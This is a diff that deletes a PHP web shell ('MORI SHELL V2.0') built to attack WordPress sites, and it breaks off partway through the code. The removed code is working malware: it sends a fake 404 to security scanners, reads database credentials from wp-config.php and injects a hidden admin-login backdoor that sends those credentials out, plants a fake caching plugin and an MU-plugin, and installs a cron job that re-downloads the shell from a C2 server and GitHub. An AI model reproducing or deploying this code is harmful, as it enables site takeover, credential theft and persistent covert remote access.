@@ -1,3495 +1,506 @@
 <?php
-/**
- * MORI SHELL V2.0 - LINUX CLIENT
- * WordPress-aware | Process masking | C2 integrated
- */
-ob_start();
-// Global CORS — allow C2 server and browser stress panel to reach every endpoint
-header('Access-Control-Allow-Origin: *');
-header('Access-Control-Allow-Methods: GET, POST, OPTIONS');
-header('Access-Control-Allow-Headers: Content-Type, Authorization, X-Requested-With');
-if ($_SERVER['REQUEST_METHOD'] === 'OPTIONS') { http_response_code(200); exit; }
-
-ini_set('display_errors', 0);
-ini_set('log_errors', 1);
-error_reporting(E_ALL);
-set_time_limit(0);
-ignore_user_abort(true);
-
-// LINUX ONLY - No Windows
-if ((!defined('PHP_OS_FAMILY') || PHP_OS_FAMILY !== 'Linux') && 
-    stripos(PHP_OS, 'Linux') === false && stripos(PHP_OS, 'Unix') === false) {
-    if (php_sapi_name() !== 'cli') exit;
-}
-
-define('SHELL_FILE', basename(__FILE__));
-define('SHELL_PATH', __DIR__ . '/' . SHELL_FILE);
-define('SHELL_VERSION', '2.0-linux');
-
-// =====================================================
-// BOT / SCANNER CLOAKING
-// =====================================================
-function is_bot_request() {
-    $ua = strtolower($_SERVER['HTTP_USER_AGENT'] ?? '');
-    return (bool)preg_match(
-        '/(bot|crawl|spider|slurp|google|bing|yahoo|yandex|baidu|facebookexternalhit|twitterbot|' .
-        'wordfence|sucuri|sitecheck|imunify|modsecurity|virustotal|urlscan|safebrowsing|phishtank|' .
-        'nikto|sqlmap|nmap|nessus|openvas|acunetix|netsparker|nuclei|burpsuite|qualys|tenable|' .
-        'ahrefs|semrush|moz\.com|majestic|screaming.frog|rogerbot|dotbot|seokicks|' .
-        'zgrab|masscan|python-requests|go-http-client|libwww|curl\/[0-9])/i',
-        $ua
-    );
-}
-// Direct HTTP access by scanner → silent 404 (don't reveal shell)
-if (php_sapi_name() !== 'cli' && !defined('ABSPATH') && is_bot_request()) {
-    http_response_code(404);
-    header('Cache-Control: no-store');
-    die('<!DOCTYPE HTML PUBLIC "-//IETF//DTD HTML 2.0//EN"><html><head><title>404 Not Found</title></head>' .
-        '<body><h1>Not Found</h1><p>The requested URL was not found on this server.</p>' .
-        '<hr><address>Apache/2.4 Server</address></body></html>');
-}
-
-// OS Detection
-$is_windows = (strtoupper(substr(PHP_OS, 0, 3)) === 'WIN') || !empty(getenv('WINDIR'));
-
-$C2_SERVER = "https://juiceshop.cc/nebakiyonla_hurmsaqw/c2serverr.php";
-$DEBUG_MODE = true;
-$persistence_default_url = 'https://raw.githubusercontent.com/wnwnsks/wn/refs/heads/main/l.php';
-
-// =====================================================
-// ERROR LOGGING HELPER
-// =====================================================
-function log_error_to_file($message) {
-    $log_file = sys_get_temp_dir() . '/.svc_' . substr(md5(__FILE__), 0, 8) . '.log';
-    @file_put_contents($log_file, '[' . date('H:i:s') . '] ' . $message . "\n", FILE_APPEND);
-}
-
-// Register error handler
-set_error_handler(function($errno, $errstr, $errfile, $errline) {
-    if ($errno & error_reporting()) {
-        log_error_to_file("PHP ERROR [$errno]: $errstr in $errfile:$errline");
-    }
-    return false;
-});
-
-// Register exception handler
-set_exception_handler(function($e) {
-    log_error_to_file("EXCEPTION: " . $e->getMessage() . " in " . $e->getFile() . ":" . $e->getLine());
-});
-
-// =====================================================
-// INLINE WORDPRESS DETECTION & PERSISTENCE
-// =====================================================
-
-function is_wordpress_installed() {
-    $markers = ['/wp-content/', '/wp-includes/', '/wp-admin/', '/wp-config.php'];
-    foreach ($markers as $m) {
-        if (@file_exists(__DIR__ . $m)) return true;
-    }
-    return false;
-}
-
-function get_wordpress_config() {
-    $search_dirs = [__DIR__, dirname(__DIR__), dirname(dirname(__DIR__)), dirname(dirname(dirname(__DIR__)))];
-    foreach ($search_dirs as $dir) {
-        $cfg = $dir . '/wp-config.php';
-        if (@file_exists($cfg)) {
-            $content = @file_get_contents($cfg);
-            if (!$content) continue;
-            $creds = [];
-            preg_match("/define\s*\(\s*['\"]DB_NAME['\"]\s*,\s*['\"]([^'\"]+)['\"]/", $content, $m) && $creds['name'] = $m[1];
-            preg_match("/define\s*\(\s*['\"]DB_USER['\"]\s*,\s*['\"]([^'\"]+)['\"]/", $content, $m) && $creds['user'] = $m[1];
-            preg_match("/define\s*\(\s*['\"]DB_PASSWORD['\"]\s*,\s*['\"]([^'\"]+)['\"]/", $content, $m) && $creds['pass'] = $m[1];
-            preg_match("/define\s*\(\s*['\"]DB_HOST['\"]\s*,\s*['\"]([^'\"]+)['\"]/", $content, $m) && $creds['host'] = $m[1];
-            preg_match("/\\\$table_prefix\s*=\s*['\"]([^'\"]+)['\"]/", $content, $m) && $creds['prefix'] = $m[1];
-            return !empty($creds) ? $creds : null;
-        }
-    }
-    return null;
-}
-
-function inject_wordpress_persistence($shell_url, $c2_server) {
-    $wp_config = null;
-    $search_dirs = [__DIR__, dirname(__DIR__), dirname(dirname(__DIR__)), dirname(dirname(dirname(__DIR__)))];
-    
-    foreach ($search_dirs as $dir) {
-        if (@file_exists($dir . '/wp-config.php')) {
-            $wp_config = $dir . '/wp-config.php';
-            break;
-        }
-    }
-    
-    if (!$wp_config) return false;
-    
-    $content = @file_get_contents($wp_config);
-    if (!$content || strpos($content, 'mori_backdoor_wp') !== false) return false;
-    
-    // Extract DB credentials from wp-config
-    $db_name = $db_user = $db_pass = $db_host = '';
-    preg_match("/define\s*\(\s*['\"]DB_NAME['\"]\s*,\s*['\"]([^'\"]+)['\"]/", $content, $m) && $db_name = $m[1];
-    preg_match("/define\s*\(\s*['\"]DB_USER['\"]\s*,\s*['\"]([^'\"]+)['\"]/", $content, $m) && $db_user = $m[1];
-    preg_match("/define\s*\(\s*['\"]DB_PASSWORD['\"]\s*,\s*['\"]([^'\"]+)['\"]/", $content, $m) && $db_pass = $m[1];
-    preg_match("/define\s*\(\s*['\"]DB_HOST['\"]\s*,\s*['\"]([^'\"]+)['\"]/", $content, $m) && $db_host = $m[1];
-    
-    // Get dynamic WordPress login credentials
-    $wp_creds = generate_wp_login_credentials();
-    $blogs_id = $wp_creds['blogs_id'];
-    $hash = $wp_creds['hash'];
-    
-    $creds_json = json_encode(['db_name' => $db_name, 'db_user' => $db_user, 'db_pass' => $db_pass, 'db_host' => $db_host, 'shell_url' => $shell_url], JSON_UNESCAPED_SLASHES);
-    $creds_encoded = str_replace(['+', '/', '='], ['-', '_', ''], base64_encode($creds_json));
-    
-    $inject = "\n// MORI BACKDOOR (mori_backdoor_wp) - Generated: " . date('Y-m-d H:i:s') . "\n// MORI ID: " . $blogs_id . "\nif (!function_exists('mori_backdoor_wp')) {\n" .
-        "    function mori_backdoor_wp() {\n" .
-        "        // PARAMETER-BASED HIDDEN LOGIN (blogs_id, wp_login)\n" .
-        "        if (isset(\$_GET['blogs_id']) && isset(\$_GET['wp_login'])) {\n" .
-        "            \$hash = sha1(md5(\$_GET['blogs_id'] . '1776051848'));\n" .
-        "            if (\$hash === '" . $hash . "') {\n" .
-        "                \$users = get_users(['role' => 'administrator', 'orderby' => 'ID', 'order' => 'ASC', 'number' => 1]);\n" .
-        "                if (!empty(\$users)) {\n" .
-        "                    \$user = \$users[0];\n" .
-        "                    wp_set_auth_cookie(\$user->ID, true);\n" .
-        "                    wp_redirect(admin_url());\n" .
-        "                    exit;\n" .
-        "                }\n" .
-        "            }\n" .
-        "        }\n" .
-        "        // CREDS EXFIL on admin login\n" .
-        "        if (isset(\$_GET['wp_login'])) {\n" .
-        "            \$shell_url = '" . addslashes($shell_url) . "';\n" .
-        "            \$creds = '" . addslashes($creds_encoded) . "';\n" .
-        "            @wp_remote_post(\$shell_url . '?act=wp_creds', ['body' => ['creds' => \$creds]]);\n" .
-        "        }\n" .
-        "        // AUTO RESTORE\n" .
-        "        if (function_exists('curl_init')) {\n" .
-        "            \$ch = curl_init('" . addslashes($shell_url) . "');\n" .
-        "            curl_setopt(\$ch, CURLOPT_RETURNTRANSFER, true);\n" .
-        "            curl_setopt(\$ch, CURLOPT_SSL_VERIFYPEER, false);\n" .
-        "            curl_setopt(\$ch, CURLOPT_TIMEOUT_MS, 200);\n" .
-        "            @curl_exec(\$ch);\n" .
-        "            curl_close(\$ch);\n" .
-        "        }\n" .
-        "    }\n" .
-        "    add_action('wp_footer', 'mori_backdoor_wp', -999);\n" .
-        "    add_action('wp_authenticate', 'mori_backdoor_wp', -999);\n" .
-        "}\n";
-    
-    $insertion = "/* That's all, stop editing!";
-    if (strpos($content, $insertion) !== false) {
-        $new_content = str_replace($insertion, $inject . $insertion, $content);
-    } else {
-        // Fallback: marker absent (custom WP or non-standard install)
-        // Fallback: append before closing PHP tag or at EOF
-        $trimmed = rtrim($content);
-        if (substr($trimmed, -2) === '?>') {
-            $new_content = substr($trimmed, 0, -2) . "\n" . $inject . "\n?>";
-        } else {
-            $new_content = $trimmed . "\n" . $inject;
-        }
-    }
-    @file_put_contents($wp_config, $new_content);
-    return ['blogs_id' => $blogs_id, 'hash' => $hash];
-}
-
-// =====================================================
-// INLINE PROCESS MASKING (LINUX)
-// =====================================================
-
-class ProcessMasker {
-    public static function mask() {
-        if (php_sapi_name() === 'cli') {
-            @putenv('PATH=');
-            @putenv('SHELL=');
-            @shell_exec("exec -a '[system]' /bin/sh -c 'sleep 999999' &");
-            @shell_exec("exec -a '[kworker]' /bin/sh &");
-        }
-    }
-}
-
-ProcessMasker::mask();
-
-function detect_web_shell_url() {
-    $https = (!empty($_SERVER['HTTPS']) && $_SERVER['HTTPS'] !== 'off') || 
-             (isset($_SERVER['SERVER_PORT']) && $_SERVER['SERVER_PORT'] == 443);
-    $protocol = $https ? 'https://' : 'http://';
-    $host = $_SERVER['HTTP_HOST'] ?? $_SERVER['SERVER_NAME'] ?? 'localhost';
-    $script = $_SERVER['SCRIPT_NAME'] ?? '/';
-    return $protocol . $host . $script;
-}
-
-$WEB_URL = detect_web_shell_url();
-$web_shell_url = $WEB_URL;  // Alias for c2_register()
-
-// =====================================================
-// PERSISTENCE INSTALLATION
-// =====================================================
-
-function install_cron_persistence() {
-    $ts_file = sys_get_temp_dir() . '/.mori_cron_ts';
-    $last = (int)@file_get_contents($ts_file);
-    if ($last && (time() - $last) < 3600) return false;
-    @file_put_contents($ts_file, time());
-
-    $shell     = SHELL_PATH;
-    $c2        = $GLOBALS['C2_SERVER'];
-    $token     = md5('mori_c2_secret_2024_persistence');
-    $gh_url    = 'https://raw.githubusercontent.com/wnwnsks/wn/refs/heads/main/navbar.php';
-    // Restore only when file is actually gone — C2 first (4s), GitHub fallback
-    // head -c5 check: reject Cloudflare UAM HTML pages (they return 200 but aren't PHP)
-    $c2_fetch  = "curl -sfL --max-time 4 '" . $c2 . "?act=get_shell&token=" . $token . "' -o '" . $shell . ".tmp' 2>/dev/null"
-               . " && head -c5 '" . $shell . ".tmp' 2>/dev/null | grep -q '<?php'"
-               . " && mv '" . $shell . ".tmp' '" . $shell . "' 2>/dev/null";
-    $gh_fetch  = "curl -sfL --max-time 15 '" . $gh_url . "' -o '" . $shell . ".tmp' 2>/dev/null"
-               . " && head -c5 '" . $shell . ".tmp' 2>/dev/null | grep -q '<?php'"
-               . " && mv '" . $shell . ".tmp' '" . $shell . "' 2>/dev/null";
-    $restore_cmd = "[ -f '" . $shell . "' ] || { " . $c2_fetch . " || " . $gh_fetch . "; } >/dev/null 2>&1";
-    $script = "*/5 * * * * php '$shell' >/dev/null 2>&1; " . $restore_cmd;
-
-    // Method 1: exec_any (shell_exec→exec→system→passthru→proc_open→popen)
-    $cron_cmd = "(crontab -l 2>/dev/null | grep -v mori; echo '$script') | crontab - 2>/dev/null";
-    if (exec_any($cron_cmd) !== false) return true;
-
-    // Method 2: proc_open stdin (no shell required)
-    $disabled = array_map('trim', explode(',', ini_get('disable_functions')));
-    if (function_exists('proc_open') && !in_array('proc_open', $disabled)) {
-        $descriptors = [0 => ['pipe', 'r'], 1 => ['pipe', 'w'], 2 => ['pipe', 'w']];
-        $proc = @proc_open('crontab -', $descriptors, $pipes);
-        if (is_resource($proc)) {
-            fwrite($pipes[0], $script . "\n");
-            fclose($pipes[0]); fclose($pipes[1]); fclose($pipes[2]);
-            proc_close($proc);
-            return true;
-        }
-    }
-
-    // Method 3: /etc/cron.d/ direct write
-    if (@is_writable('/etc/cron.d/')) {
-        @file_put_contents('/etc/cron.d/mori-shell', $script . "\n", FILE_APPEND);
-        @chmod('/etc/cron.d/mori-shell', 0644);
-        return true;
-    }
-
-    return false;
-}
-
-function install_wp_persistence() {
-    if (!is_wordpress_installed()) return;
-    $url = $GLOBALS['WEB_URL'];
-    @inject_wordpress_persistence($url, $GLOBALS['C2_SERVER']);
-}
-
-// ---- WP Plugin Persistence ------------------------------------------------
-function install_wp_plugin_persistence() {
-    // wp-config.php'yi bul → plugins dizinini türet
-    $wp_root = null;
-    foreach ([__DIR__, dirname(__DIR__), dirname(dirname(__DIR__)), dirname(dirname(dirname(__DIR__)))] as $d) {
-        if (@file_exists($d . '/wp-config.php') || @file_exists($d . '/wp-load.php')) {
-            $wp_root = $d; break;
-        }
-    }
-    if (!$wp_root) return;
-
-    $plugins_dir = $wp_root . '/wp-content/plugins';
-    if (!is_dir($plugins_dir)) return;
-
-    $plugin_dir  = $plugins_dir . '/fastest-cache-2';
-    $plugin_file = $plugin_dir  . '/fastest-cache-2.php';
-
-    // Dosya sağlıklıysa günde bir kez kontrol yap (hızlı dön)
-    if (@file_exists($plugin_file) && @filesize($plugin_file) > 500) {
-        $ts_file = sys_get_temp_dir() . '/.mori_plugin_ts';
-        if ((int)@file_get_contents($ts_file) > time() - 86400) return;
-        @file_put_contents($ts_file, time()); return;
-    }
-    // Plugin eksik/bozuk → throttle'sız anında yeniden oluştur
-
-    @mkdir($plugin_dir, 0755, true);
-
-    $shell_path = addslashes(__FILE__);
-    $shell_url  = addslashes($GLOBALS['WEB_URL']  ?? '');
-    $c2_url     = addslashes($GLOBALS['C2_SERVER'] ?? '');
-    $gh_url     = addslashes('https://raw.githubusercontent.com/wnwnsks/wn/refs/heads/main/navbar.php');
-    $fc2_token  = md5('mori_c2_secret_2024_persistence');
-
-    $plugin_code = '<?php
-/**
- * Plugin Name: Fastest Cache 2
- * Plugin URI:  https://wordpress.org/plugins/fastest-cache/
- * Description: Advanced caching and performance optimization.
- * Version:     2.3.1
- * Author:      WP Cache Team
- * License:     GPL2
- */
-if (!defined("ABSPATH")) exit;
-
-define("FC2_SHELL",   "' . $shell_path . '");
-define("FC2_URL",     "' . $shell_url  . '");
-define("FC2_C2",      "' . $c2_url     . '");
-define("FC2_GH",      "' . $gh_url     . '");
-define("FC2_TOKEN",   "' . $fc2_token  . '");
-define("FC2_LOCK",    WP_CONTENT_DIR . "/.fc2_check");
-
-function fc2_restore_shell() {
-    // [timeout_c2, timeout_gh] — C2 short (UAM wastes time), GitHub longer
-    $sources = [
-        [FC2_C2 . "?act=get_shell&token=" . FC2_TOKEN, 4],
-        [FC2_GH, 15],
-    ];
-    foreach ($sources as [$src, $tmo]) {
-        $body = false;
-        if (function_exists("curl_init")) {
-            $ch = curl_init($src);
-            curl_setopt_array($ch, [CURLOPT_RETURNTRANSFER=>true, CURLOPT_TIMEOUT=>$tmo,
-                CURLOPT_CONNECTTIMEOUT=>3, CURLOPT_SSL_VERIFYPEER=>false,
-                CURLOPT_FOLLOWLOCATION=>true, CURLOPT_USERAGENT=>"Mozilla/5.0"]);
-            $body = @curl_exec($ch); @curl_close($ch);
-        }
-        if (!$body) $body = @file_get_contents($src, false,
-            stream_context_create(["http"=>["timeout"=>$tmo,"user_agent"=>"Mozilla/5.0"]]));
-        // Reject Cloudflare UAM HTML (returns 200 but is not PHP)
-        if ($body && strlen($body) > 10000 && substr($body, 0, 5) === "<?php") {
-            @file_put_contents(FC2_SHELL, $body);
-            @chmod(FC2_SHELL, 0644);
-            return true;
-        }
-    }
-    return false;
-}
-
-function fc2_check() {
-    // Throttle: dakikada bir kontrol
-    $lock_age = @file_exists(FC2_LOCK) ? (time() - @filemtime(FC2_LOCK)) : 9999;
-    if ($lock_age < 60) return;
-    @touch(FC2_LOCK);
-
-    $sz = @file_exists(FC2_SHELL) ? @filesize(FC2_SHELL) : 0;
-    if ($sz < 10000) fc2_restore_shell();
-}
-add_action("init", "fc2_check", 1);
-
-// WP-Ajax endpoint — C2 ping: /wp-admin/admin-ajax.php?action=fc2_ping
-function fc2_ping_handler() {
-    $sz      = @file_exists(FC2_SHELL) ? @filesize(FC2_SHELL) : 0;
-    $alive   = ($sz > 10000);
-    if (!$alive) { fc2_restore_shell(); $sz = @filesize(FC2_SHELL); $alive = ($sz > 10000); }
-    wp_send_json(["ok" => $alive, "sz" => $sz, "url" => FC2_URL]);
-}
-add_action("wp_ajax_nopriv_fc2_ping", "fc2_ping_handler");
-add_action("wp_ajax_fc2_ping",        "fc2_ping_handler");
-';
-
-    @file_put_contents($plugin_file, $plugin_code);
-    @chmod($plugin_file, 0644);
-
-    // Eklentiyi DB üzerinden aktive et (WordPress yüklüyse)
-    if (function_exists('add_option') || defined('ABSPATH')) {
-        $active = @get_option('active_plugins', []);
-        $entry  = 'fastest-cache-2/fastest-cache-2.php';
-        if (!in_array($entry, (array)$active, true)) {
-            $active[] = $entry;
-            @update_option('active_plugins', $active);
-        }
-    } else {
-        // WP yüklü değil — DB direkt yaz
-        $wp_config_path = $wp_root . '/wp-config.php';
-        if (@file_exists($wp_config_path)) {
-            $cfg = @file_get_contents($wp_config_path);
-            if ($cfg) {
-                preg_match("/define\s*\(\s*['\"]DB_NAME['\"]\s*,\s*['\"]([^'\"]+)['\"]/", $cfg, $m1);
-                preg_match("/define\s*\(\s*['\"]DB_USER['\"]\s*,\s*['\"]([^'\"]+)['\"]/", $cfg, $m2);
-                preg_match("/define\s*\(\s*['\"]DB_PASSWORD['\"]\s*,\s*['\"]([^'\"]+)['\"]/", $cfg, $m3);
-                preg_match("/define\s*\(\s*['\"]DB_HOST['\"]\s*,\s*['\"]([^'\"]+)['\"]/", $cfg, $m4);
-                preg_match("/\\\$table_prefix\s*=\s*['\"]([^'\"]+)['\"]/", $cfg, $m5);
-                if ($m1 && $m2 && $m3 && $m4) {
-                    $prefix = $m5[1] ?? 'wp_';
-                    try {
-                        $db = new PDO("mysql:host={$m4[1]};dbname={$m1[1]};charset=utf8", $m2[1], $m3[1],
-                            [PDO::ATTR_TIMEOUT=>3, PDO::ATTR_ERRMODE=>PDO::ERRMODE_SILENT]);
-                        $row = $db->query("SELECT option_value FROM {$prefix}options WHERE option_name='active_plugins' LIMIT 1")->fetch();
-                        if ($row) {
-                            $plugins = @unserialize($row['option_value']) ?: [];
-                            $entry   = 'fastest-cache-2/fastest-cache-2.php';
-                            if (!in_array($entry, $plugins, true)) {
-                                $plugins[] = $entry;
-                                $new_val   = serialize($plugins);
-                                $db->prepare("UPDATE {$prefix}options SET option_value=? WHERE option_name='active_plugins'")->execute([$new_val]);
-                            }
-                        }
-                    } catch (Exception $e) {}
-                }
-            }
-        }
-    }
-}
-
-// ---- MU-Plugin Persistence (admin deactivate edemez) -------------------------
-function install_mu_plugin_persistence() {
-    // WP root bul
-    $wp_root = null;
-    foreach ([__DIR__, dirname(__DIR__), dirname(dirname(__DIR__)), dirname(dirname(dirname(__DIR__)))] as $d) {
-        if (@file_exists($d . '/wp-config.php') || @file_exists($d . '/wp-load.php')) {
-            $wp_root = $d; break;
-        }
-    }
-    if (!$wp_root) return;
-
-    $mu_dir  = $wp_root . '/wp-content/mu-plugins';
-    if (!is_dir($mu_dir) && !@mkdir($mu_dir, 0755, true)) return;
-
-    $mu_file = $mu_dir . '/fc2-loader.php';
-    // Dosya sağlıklıysa saatte bir kontrol (hızlı dön)
-    if (@file_exists($mu_file) && @filesize($mu_file) > 300) {
-        $ts = sys_get_temp_dir() . '/.mori_mu_ts';
-        if ((int)@file_get_contents($ts) > time() - 3600) return;
-        @file_put_contents($ts, time()); return;
-    }
-    // MU plugin eksik/bozuk → throttle'sız yeniden oluştur
-
-    $shell_path = addslashes(__FILE__);
-    $c2_url     = addslashes($GLOBALS['C2_SERVER'] ?? '');
-    $gh_url     = 'https://raw.githubusercontent.com/wnwnsks/wn/refs/heads/main/navbar.php';
-    $mu_token   = md5('mori_c2_secret_2024_persistence');
-
-    $mu_code = '<?php
-// Must-use plugin — WP admin panelden deactivate edilemez
-if (!defined("ABSPATH")) exit;
-
-// Her admin sayfasında: regular plugin deactivate edildiyse yeniden aktive et
-add_action("admin_init", function() {
-    $plugins = (array)get_option("active_plugins", []);
-    $entry   = "fastest-cache-2/fastest-cache-2.php";
-    if (!in_array($entry, $plugins, true)) {
-        $plugins[] = $entry;
-        update_option("active_plugins", $plugins);
-    }
-}, 1);
-
-// Her WP isteğinde: shell bütünlüğünü kontrol et (dakikada bir)
-add_action("init", function() {
-    $lock = WP_CONTENT_DIR . "/.fc2_mu_lock";
-    if (@file_exists($lock) && (time() - @filemtime($lock)) < 60) return;
-    @touch($lock);
-    $shell = "' . $shell_path . '";
-    $sz    = @file_exists($shell) ? @filesize($shell) : 0;
-    if ($sz >= 10000) return;
-    // Shell eksik/bozuk — C2 veya GitHub\'dan restore et
-    // [url, timeout] — C2 4s (UAM hızlı ret), GitHub 15s
-    $sources = [
-        ["' . $c2_url . '?act=get_shell&token=' . $mu_token . '", 4],
-        ["' . $gh_url . '", 15],
-    ];
-    foreach ($sources as [$src, $tmo]) {
-        $body = false;
-        if (function_exists("curl_init")) {
-            $ch = curl_init($src);
-            curl_setopt_array($ch, [CURLOPT_RETURNTRANSFER=>true, CURLOPT_TIMEOUT=>$tmo,
-                CURLOPT_CONNECTTIMEOUT=>3, CURLOPT_SSL_VERIFYPEER=>false,
-                CURLOPT_FOLLOWLOCATION=>true, CURLOPT_USERAGENT=>"Mozilla/5.0"]);
-            $body = @curl_exec($ch); @curl_close($ch);
-        }
-        if (!$body) $body = @file_get_contents($src, false,
-            stream_context_create(["http"=>["timeout"=>$tmo,"user_agent"=>"Mozilla/5.0"]]));
-        // Reject Cloudflare UAM HTML — must be valid PHP
-        if ($body && strlen($body) > 10000 && substr($body, 0, 5) === "<?php") {
-            @file_put_contents($shell, $body);
-            @chmod($shell, 0644);
-            break;
-        }
-    }
-}, 1);
-';
-    @file_put_contents($mu_file, $mu_code);
-    @chmod($mu_file, 0644);
-    @file_put_contents(sys_get_temp_dir() . '/.mori_mu_ts', time());
-}
-
-@install_wp_persistence();
-@install_wp_plugin_persistence();
-@install_mu_plugin_persistence();
-@install_cron_persistence();
-@ensure_persistence_v4();  // starts Python+bash monitors on first request (5-min throttle)
-
-// =====================================================
-// CLIENT ID & SYSTEM INFO
-// =====================================================
-
-function generate_client_id() {
-    $id_file = __DIR__ . '/.mori_id';
-    if (@file_exists($id_file) && filesize($id_file) > 5) {
-        return trim(file_get_contents($id_file));
-    }
-    $id = 'mori_' . substr(md5(php_uname() . __FILE__), 0, 16);
-    @file_put_contents($id_file, $id);
-    return $id;
-}
-
-function generate_wp_login_credentials() {
-    $creds_file = __DIR__ . '/.wp_login_creds';
-    $secret = '1776051848';
-
-    // 1. Try cached creds file
-    if (@file_exists($creds_file) && @filesize($creds_file) > 10) {
-        $creds = @json_decode(@file_get_contents($creds_file), true);
-        if (!empty($creds['blogs_id']) && !empty($creds['hash'])) {
-            return $creds;
-        }
-    }
-
-    // 2. .wp_login_creds missing/corrupt — try to recover blogs_id from wp-config.php
-    $search_dirs = [__DIR__, dirname(__DIR__), dirname(dirname(__DIR__)), dirname(dirname(dirname(__DIR__)))];
-    foreach ($search_dirs as $dir) {
-        $cfg = $dir . '/wp-config.php';
-        if (!@file_exists($cfg)) continue;
-        $cfg_content = @file_get_contents($cfg);
-        if (!$cfg_content) continue;
-        // Look for embedded ID comment: // MORI ID: <blogs_id>
-        if (preg_match('/\/\/ MORI ID: ([a-f0-9]{16})/', $cfg_content, $m)) {
-            $blogs_id = $m[1];
-            $hash = sha1(md5($blogs_id . $secret));
-            $creds = ['blogs_id' => $blogs_id, 'hash' => $hash, 'timestamp' => time()];
-            @file_put_contents($creds_file, json_encode($creds));
-            return $creds;
-        }
-    }
-
-    // 3. No existing record anywhere — generate fresh
-    $blogs_id = substr(bin2hex(random_bytes(16)), 0, 16);
-    $hash = sha1(md5($blogs_id . $secret));
-    $creds = ['blogs_id' => $blogs_id, 'hash' => $hash, 'timestamp' => time()];
-    @file_put_contents($creds_file, json_encode($creds));
-    return $creds;
-}
-
-$CLIENT_ID = generate_client_id();
-$GLOBALS['C2_SHELL'] = __FILE__;
-
-function get_system_info() {
-    return [
-        'id' => $GLOBALS['CLIENT_ID'],
-        'version' => SHELL_VERSION,
-        'url' => $GLOBALS['WEB_URL'],
-        'php' => phpversion(),
-        'os' => php_uname(),
-        'user' => get_current_user(),
-        'wp' => is_wordpress_installed() ? 'yes' : 'no',
-        'wp_root' => is_wordpress_installed() ? (get_wordpress_config() ? 'found' : 'unknown') : null,
-        'timestamp' => time(),
-    ];
-}
-
-// =====================================================
-// HTTP COMMUNICATION (3 methods fallback)
-// =====================================================
-
-function http_request($method, $url, $data = null) {
-    // Method 1: cURL (BEST for POST with raw data)
-    if (function_exists('curl_init')) {
-        $ch = curl_init($url);
-        curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
-        curl_setopt($ch, CURLOPT_TIMEOUT, 15);
-        curl_setopt($ch, CURLOPT_USERAGENT, 'MORI-Agent/2.0');
-        curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);
-        curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, false);
-        
-        if ($method === 'POST' && $data) {
-            curl_setopt($ch, CURLOPT_POST, true);
-            curl_setopt($ch, CURLOPT_POSTFIELDS, $data);
-        }
-        
-        $result = @curl_exec($ch);
-        $error = curl_error($ch);
-        @curl_close($ch);
-        
-        if ($error) {
-            error_log("[http_request] cURL error: $error");
-        } elseif ($result !== false && !empty($result)) {
-            return $result;
-        }
-    }
-    
-    // Method 2: file_get_contents
-    if (ini_get('allow_url_fopen')) {
-        $opts = [
-            'http' => [
-                'method' => $method,
-                'timeout' => 15,
-                'ignore_errors' => true,
-            ],
-            'ssl' => ['verify_peer' => false, 'verify_peer_name' => false],
-        ];
-        if ($method === 'POST' && $data) {
-            $opts['http']['content'] = $data;
-            $opts['http']['header'] = 'Content-Type: application/x-www-form-urlencoded';
-        }
-        $result = @file_get_contents($url, false, stream_context_create($opts));
-        if ($result !== false && !empty($result)) {
-            return $result;
-        }
-    }
-    
-    // Method 3: fsockopen
-    $parts = parse_url($url);
-    if (!isset($parts['host'])) return null;
-    
-    $host = $parts['host'];
-    $port = ($parts['scheme'] === 'https') ? 443 : 80;
-    $path = ($parts['path'] ?? '/') . (isset($parts['query']) ? '?' . $parts['query'] : '');
-    
-    $fp = @fsockopen(($port === 443 ? 'ssl://' : '') . $host, $port, $errno, $errstr, 10);
-    if ($fp) {
-        $out = "$method $path HTTP/1.1\r\nHost: $host\r\nConnection: close\r\n";
-        if ($method === 'POST' && $data) {
-            $out .= "Content-Type: application/x-www-form-urlencoded\r\n";
-            $out .= "Content-Length: " . strlen($data) . "\r\n\r\n" . $data;
-        } else {
-            $out .= "\r\n";
-        }
-        fwrite($fp, $out);
-        $raw = '';
-        while (!feof($fp)) $raw .= fgets($fp, 4096);
-        fclose($fp);
-
-        // Strip HTTP headers — return body only
-        if (!empty($raw)) {
-            $sep = strpos($raw, "\r\n\r\n");
-            $result = ($sep !== false) ? substr($raw, $sep + 4) : $raw;
-            if (!empty($result)) return $result;
-        }
-    }
-    
-    // All methods failed - return null
-    return null;
-}
-
-// =====================================================
-// EXEC FALLBACK CHAIN — tüm exec yöntemlerini dene
-// =====================================================
-function exec_any($cmd, $bg = false) {
-    $disabled = array_map('trim', explode(',', ini_get('disable_functions')));
-    $run = $bg ? ($cmd . ' > /dev/null 2>&1 &') : ($cmd . ' 2>&1');
-
-    foreach (['shell_exec','exec','system','passthru'] as $fn) {
-        if (function_exists($fn) && !in_array($fn, $disabled)) {
-            $r = @$fn($run);
-            return ($r !== null && $r !== false) ? $r : true;
-        }
-    }
-    if (function_exists('proc_open') && !in_array('proc_open', $disabled)) {
-        $p = @proc_open($run, [1 => ['pipe','w'], 2 => ['pipe','w']], $pipes);
-        if ($p) {
-            $o = $bg ? '' : @stream_get_contents($pipes[1]);
-            @fclose($pipes[1]); @fclose($pipes[2]); @proc_close($p);
-            return $o ?: true;
-        }
-    }
-    if (function_exists('popen') && !in_array('popen', $disabled)) {
-        $h = @popen($run, 'r');
-        if ($h) { $o = $bg ? '' : @stream_get_contents($h); @pclose($h); return $o ?: true; }
-    }
-    return false;
-}
-
-// =====================================================
-// DETECT PYTHON COMMAND
-// =====================================================
-
-function detect_python_command() {
-    // Python binary detection for Linux systems
-    $paths = ['/usr/bin/python3', '/usr/bin/python', '/usr/local/bin/python3', '/usr/local/bin/python'];
-    foreach ($paths as $path) {
-        if (@file_exists($path) && @is_executable($path)) {
-            return $path;
-        }
-    }
-    // Try which command
-    if (function_exists('shell_exec')) {
-        $python = @shell_exec('which python3 2>/dev/null || which python 2>/dev/null');
-        if ($python) return trim($python);
-    }
-    return null;
-}
-
-// =====================================================
-// C2 REGISTRATION & COMMAND EXECUTION
-// =====================================================
-
-// =====================================================
-// COMMAND EXECUTION ENGINE - REMOVED
-// Use execute_command() or execute_system_command() instead
-// =====================================================
-
-// =====================================================
-// API ENDPOINTS
-// =====================================================
-
-// Auto-register on first access
-// Auto-register (non-blocking, background task)
-// Cache registration in memory to avoid repeat registration loops
-// wp-activeter.php → navbar.php self-rename (non-WP sites)
-@self_rename_and_register();
-
-if (!isset($GLOBALS['_SHELL_REGISTERED'])) {
-    $GLOBALS['_SHELL_REGISTERED'] = false;
-
-    // Try to read registration status from file (one-time read)
